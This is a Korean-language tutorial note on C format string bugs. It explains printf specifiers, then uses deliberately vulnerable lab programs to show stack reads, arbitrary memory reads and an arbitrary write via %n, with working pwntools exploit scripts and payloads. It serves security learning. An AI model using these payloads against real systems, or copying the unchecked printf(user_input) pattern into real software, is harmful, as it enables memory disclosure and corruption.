# Format String Bug

C에는 문자열을 다루는 여러 함수들이 존재하는데, 이 중 `printf, scanf, fprintf, fscanf` 함수의 이름이 `f(formatted)`로 끝나고 문자열을 다루는 함수라면 포맷스트링을 처리하는 함수들이다.

이 함수들을 포맷 스트링을 채울 값들을 `레지스터`나 `스택`에서 가져오는데, 함수 내부에 **`포맷 스트링이 필요로 하는 인자의 개수`와 `함수에 전달된 인자의 개수`를 비교하는 루틴이 존재하지 않는다.**

예를 들어, `printf("Value: %d %d %d\n");`라는 코드를 보자. 여기서 `포맷 스트링이 필요로 하는 인자의 개수`는 3개인데, `함수에 전달된 인자의 개수`는 없기 때문에 이를 비교하지 않고, 그냥 레지스터나 스택에서 인자를 가져오게 된다. 

이 특징 때문에 만약 포맷스트링을 사용자가 임의로 입력할 수 있다면, 사용자가 레지스터나 스택의 값을 원하는대로 읽어올 수 있고 다양한 포맷스트링을 활용하여 원하는 레지스터나 스택의 위치에 임의의 값을 쓰는 것도 가능하다.

# Format String

포맷 스트링은 아래와 같은 형식을 가진다.

- `%[parameter][flags][width][.precision][length]type`

여기서 우리가 중요하게 볼 점은 `paramter, width, type`이 있다.

## `type` 또는 `specifier` : 형식 지정자

인자를 어떻게 사용할지 지정하는 자리이다.

| 형식 지정자 | 설명                             |
|--------------|----------------------------------|
| `d`          | 부호있는 10진수 정수             |
| `s`          | 문자열                           |
| `x`          | 부호없는 16진수 정수             |
| `n`          | 인자에 현재까지 사용된 문자열의 길이를 저장 |
| `p`          | `void`형 포인터                  |

## `width` : 너비 지정자 

최소 너비를 지정해준다. 치환되는 문자열이 이 값보다 짧을 경우 공백 문자를 패딩해준다.

| 너비 지정자 | 설명 |
|-|-|
|`정수`|정수의 값만큼을 최소 너비로 지정한다.|
|`*`|인자의 값 만큼을 최소 너비로 지정한다.|

아래의 예제를 보며 `%n`의 쓰임과 `*`의 쓰임에 대해서 알아보자.

```
printf("%s%n: hi\n", "Alice", &num);  // "Alice: hi", num = 5
printf("%*s: hello\n", num, "Bob");   // "  Bob: hello"
```

여기서 첫번째 `printf`를 보면, 인자로 `%s`에는 `"Alice"`를 전달하고, `%n`에는 `&num`을 전달한다. `%n`은 우리가 인자에 현재까지 사용된 문자열의 길이를 저장하는 형식 지정자라고 했다.

따라서, `"Alice"`의 문자열 길이는 `5`이기 때문에 `num` 변수에는 `5`가 저장되게 된다. 이후, `printf("%*s: hello\n", num, "Bob");`에서는 `*`을 통해 인자로 전달한 `num`의 길이만큼 너비를 지정하게 되어 `"  Bob"`으로 출력된다.

`%n`을 쓰는 이유는, 포맷스트링의 인자가 사용자의 입력에 영향을 받는다면 실제 바이너리를 실행하여 입력을 받기 전에는 포맷 스트링의 길이를 알 수 없다.

따라서, `%n`을 사용한다면, 사용자가 만약 `"Alice"`보다 훨씬 긴 문자를 입력했더라도 아래의 `printf("%*s: hello\n", num, "Bob");`에서 바로 위의 문장과 정렬되서 출력할 수 있게 된다.

## `paramter`

참조할 인자의 `인덱스`를 지정한다. 인덱스는 `1`부터 시작하고 이 필드의 끝은 `$`로 표기해야 하며, **인덱스의 범위를 전달된 인자의 갯수와 비교하지 않는다.**

`printf("%2$d, %1$d\n", 2, 1);  // "1, 2"`

# 레지스터 및 스택 읽기

```
// Name: fsb_stack_read.c
// Compile: gcc -o fsb_stack_read fsb_stack_read.c

#include <stdio.h>

int main() {
  char format[0x100];

  printf("Format: ");
  scanf("%[^\n]", format);
  printf(format);

  return 0;
}
```

해당 바이너리를 살펴보면, `printf`의 포맷 스트링으로 사용되는 `format`를 사용자가 직접 입력할 수 있다. 참고로 `int printf(const char *format, ...);`가 기본형이다.

만약 `scanf("%[^\n]", format);`을  통해 `%p %p %p %p %p %p %p %p`을 입력하는 상황을 생각해보자. (`[^\n]`는 `\n`이 들어올때까지 입력을 받고 `\n`을 무시하는 포맷 스트링이다.)

`x64`의 함수 호출 규약을 생각해보면, 인자를 `rdi, rsi, rdx, rcx, r8, r9, [rsp], [rsp + 0x8], [rsp + 0x10], ...` 순서대로 가져오게 된다. (참고로 `rsp`는 레지스터에 저장된 stack top의 주소 자체를 나타내고, `[rsp]`는 `rsp`가 가리키는 메모리의 주소에 저장된 값을값을 나타낸다.)

따라서 `%p`로 해당 순서대로 레지스터와 스택에서 인자를 가져오는데, 바이너리마다 다르지만 대부분 `rsi, rdx, ...` 순서대로 가져오게 된다. (`rdi` 부터 가져오기도 한다.)

사실 우리 포맷 스트링을 통해 어떤 값을 입력하거나 읽어올 때, 스택에 있는 값을 주로 읽어오기 때문에 `[rsp]`가 몇번째인지가 제일 궁금하다.

따라서, `scanf`를 통해 `AAAAAAA %[n]$p`를 입력해주어서 `AAAAAAAA`가 몇번째 인자에 저장되있는지 테스트해보면서 출력해보면 `[rsp]` 또는 `format`의 위치를 알 수 있다.

여기서 주의할 점은 `format`에 입력할 때, `A`와 같은 테스트 입력 값을 `8bytes` 단위로 입력해야 `%[n]$p`를 통해 위치를 정확히 판단할 수 있고, `%[n]$p`가 아닌 `%[n]$s` 로 읽으려고 하면 `[rsp]`에 저장될 `0x414141..(AAA..)`을 주소로 해석하여(`char *`) 해당 주소에 저장된 값을 읽어오기 때문에 `0x414141...`라는 메모리 주소에 저장된 값을 읽을 때는 유효하지 않은 주소이기 때문에 `segfault`가 난다. (`64-bit`에서 상위 2바이트는 안쓰기 때문에 `0x4141..41`은 존재할 수 없는 주소임)

따라서, `%[n]$p`로 `0x414141..`이 출력되는 `n`을 구해서 해당 `n`을 기준으로 `format` 또는 `format`이 이번 바이너리처럼 `rsp`에 위치하면 `rsp`의 위치를 알 수 있다.

그럼 실제로 해당 바이너리에 `AAAAAAAA %6$p`, `AAAAAAAA %6$s` `AAAAAAAA %7$s` 를 입력한 결과를 살펴보자.

### `AAAAAAAA %6$p`

<img width="237" alt="image" src="https://github.com/user-attachments/assets/0d4e03d1-feec-46b6-8191-cb35f94fdaff">

출력값을 보면, `A`의 아스키코드 값인 `0x41`이 정상적으로 출력되는 것을 알 수 있다. 따라서 `6`번째 인자인 `rsp`에 `format`이 존재하는 것을 알 수 있다.

### `AAAAAAAA %6$s`

<img width="285" alt="image" src="https://github.com/user-attachments/assets/a01b26cd-8f1c-45c6-8e3b-d71bbc49d9c1">

출력값을 보면 앞에서 설명했듯이 `[rsp]`를 주소로 해석하여 `[rsp]`가 가리키는 메모리의 주소를 참조하여 해당 값을 문자열로 읽어오기 때문에 `segfault`가 발생한다.

### `AAAAAAAA %7$p`

<img width="189" alt="image" src="https://github.com/user-attachments/assets/e3e96fa9-3533-423b-a165-1570966a1d06">

`%7$p`는 `[rsp + 0x8]` 으로, `format[8]`에 해당하게 되는데 우리가 `AAAAAAAA %7$p`를 입력했기 때문에, ` %7$p`의 아스키 코드 값인 `0x20 0x25 0x37 0x24 0x70`이 거꾸로 들어가게 될 것이다.

# 임의 주소 읽기

```
// Name: fsb_aar.c
// Compile: gcc -o fsb_aar fsb_aar.c

#include <stdio.h>

const char *secret = "THIS IS SECRET";

int main() {
  char format[0x100];

  printf("Address of `secret`: %p\n", secret);
  printf("Format: ");
  scanf("%[^\n]", format);
  printf(format);

  return 0;
}
```

해당 바이너리에서 `secret`에 저장된 값을 읽어보자.

먼저 `printf("Address of `secret`: %p\n", secret);` 에 `secret`의 주소를 출력해준다. 그리고, `scanf("%[^\n]", format);`를 통해 포맷 스트링을 직접 입력할 수 있다.

그럼 `format`에 `[rsp + 0x__]`로 값을 읽을 수 있도록 해당 위치에 `secret`의 주소를 입력해준 후, `%[n]$s`를 통해 해당 위치를 읽는다면 `secret`의 주소가 가리키는 문자열을 읽을 수 있을 것이다.

먼저, `format`의 `[n]`이 얼마인지 찾기 위해 `A.. %[n]$p`를 입력해보며 테스트해보자. 바이너리에서도 예상할 수 있지만, 아래와 같이 6번째인 `rsp`가 `format`의 주소와 같을 것이다.

<img width="238" alt="image" src="https://github.com/user-attachments/assets/a4f61d21-e933-472b-b83f-67238f717d8f">

처음에는 이를 보고 `secret의 주소` + `%6$s` 를 전달해주면 `[rsp]`에 `secret`의 주소가 입력되고, 바로 `%6$s`를 통해 `[rsp]` 가 가리키는 문자열을 읽게 되니까 익스플로잇이 가능하다고 생각했는데,

`secret`의 주소가 입력되는 과정에서 포맷스트링이 정상적으로 처리되지 않아서인지(%가 들어갔다거나, 다른 형식지정자가 끼었다던가) 해서 제대로 익스플로잇이 되지 않았다.

따라서, `%[n]$s`이 포맷스트링의 처음값이 되어서 앞에서부터 잘 출력이 되도록, `[rsp + 0x8]`에 `secret`의 주소를 입력해주고, 한칸 더 이동해서 `%7$s`로 읽어주도록, **`%7$s(8바이트로 맞춰줘야함) + secret의 주소`**를 익스플로잇으로 전달해주면 해결된다.

```
#!/usr/bin/python3
# Name: fsb_aar.py

from pwn import *

p = process("./fsb_aar")
p.recvuntil("`secret`: ")

addr_secret = int(p.recvline()[:-1], 16)

fstring = b"%7$s".ljust(8)
# fstring = b"%7$s" + b"\x00" * 0x4
fstring += p64(addr_secret)

# 아래는 포맷스트링에 간섭이 나서 안됨
# fstring = p64(addr_secret)
# fstring += b"%6$s".ljust(8)

p.sendline(fstring)
p.interactive()
```

위와 같이 익스플로잇 코드를 짤 수 있고, `ljust(8)`을 해줘야 하는 이유는, `%[n]$s`를 통해 스택에서 `8bytes` 단위로 읽을 수 있기 때문에, 형식지정자를 8바이트로 맞춰줘야 하기 때문에 8바이트보다 작다면 `공백`을 추가해주는 역할을 하는 `ljust(8)`을 써줬다.

`ljust(8)` 대신, `%7$s`에는 4바이트가 부족하기 때문에 뒤에 `+ b"\x00" * 0x4`를 해줘도 상관 없다.

### 참고

계속 헷갈리는데, 문자열을 입력할 때, "AAA B" 를 입력하면 LSB(가장 왼쪽)인 `A`가 가장 낮은 주소에 들어가고 `B`가 가장 높은 주소에 들어가기 때문에 8바이트로 만들 때, 뒤에 `b"\x00"`을 더해줘야 하는 것이다.

<img width="343" alt="image" src="https://github.com/user-attachments/assets/fb2df037-65c1-4277-9fa3-0b1967984861">

`x/gx`로 출력할 때, 맨앞이 높은 주소가 맨뒤가 낮은 주소이다.

# 임의 주소 쓰기

```
// Name: fsb_aaw.c
// Compile: gcc -o fsb_aaw fsb_aaw.c

#include <stdio.h>

int secret;

int main() {
  char format[0x100];

  printf("Address of `secret`: %p\n", &secret);
  printf("Format: ");
  scanf("%[^\n]", format);
  printf(format);

  printf("Secret: %d", secret);

  return 0;
}
```

해당 바이너리를 보면, `format`의 주소를 출력해주고, 포맷 스트링인 `format`을 입력할 수 있다. 그리고 이후 `secret`의 값을 출력해주는데 `secret`의 값을 `31337`로 쓰려면 어떻게 해줘야 할까?

앞에서 봤던 형식 지정자 중에 `%n`을 이용하면 된다. `%n`은 인자에 `현재까지 인자에 사용된 문자열의 길이`를 저장해주는데, 

`%[n]$n`을 이용해서 `secret`의 주소를 `[rsp + 0x__]` 에 입력해주고, 해당 `[rsp + 0x__]`에 해당하는 `[n]$`을 찾아서 `31337`을 입력할 방법을 찾으면 된다.

`31337`은 `%31337c` 를 통해 너비를 `31337` 으로 지정해서 길이를 `31337`으로 만들어주면 된다.

<img width="238" alt="image" src="https://github.com/user-attachments/assets/004d7e48-288e-4354-8232-3e9f775c620b">

이미지를 보면, 이번 바이너리도 똑같이 `[rsp]`가 6번째 인자에 위치함을 알 수 있다.

1. `[rsp]`에 `%31337c`를 넣어서 먼저 인자의 길이를 설정해주고,

2. `[rsp + 0x8]`에 `%8$n`을 통해 `[rsp + 0x10]`에 `31337`이 입력되도록 해주고,

3. `[rsp + 0x10]`에는 `secret`의 주소를 넣으면 될 것이다.

근데 여기서 주의해야할 점이 처음에 아래와 같이 익스플로잇을 작성했는데, 이렇게 되면 `%n`은 해당 인자가 나오기 전까지 모든 문자열을 포함한 길이가 입력되기 때문에, `31337의 길이 + 공백`으로 되서 `secret`이 `31338`이 되버린다.

```
payload = b"%31337c".ljust(8)
payload += b"%8$n".ljust(8)
payload += p64(secret_addr)
```

따라서, `%31337c`와 `%8$n`을 붙여서 아래와 같이 `payload`를 작성해야 한다.

```
from pwn import *

p = process("./fsb_aaw")

p.recvuntil("`secret`: ")

secret_addr = int(p.recvline()[:-1], 16)


payload = b"%31337c%8$n".ljust(16)
payload += p64(secret_addr)

# payload = b"%31337c".ljust(8)
# payload += b"%8$n".ljust(8)
# payload += p64(secret_addr)

p.sendline(payload)
p.interactive()
```

# 포맷 스트링 버그 예제

```
// fsb_auth.c

#include <stdio.h>

int main(void) {
  int auth = 0x42424242;
  char buf[32] = {0, };
  
  read(0, buf, 32);
  printf(buf);
  
  // make auth to 0xff
}
```

해당 바이너리를 살펴보면, `printf`의 포맷 스트링으로 사용되는 `buf`를 사용자가 직접 입력할 수 있다.

여기서 `auth`는 아래의 이미지와 같이 `buf - 0x4`의 주소에 위치하는데 `auth`의 값을 `0xff`로 덮어쓰려면 어떤 값을 입력해줘야 할까?

<img width="547" alt="image" src="https://github.com/user-attachments/assets/79091f12-422f-485f-a94f-6bc96505bb41">
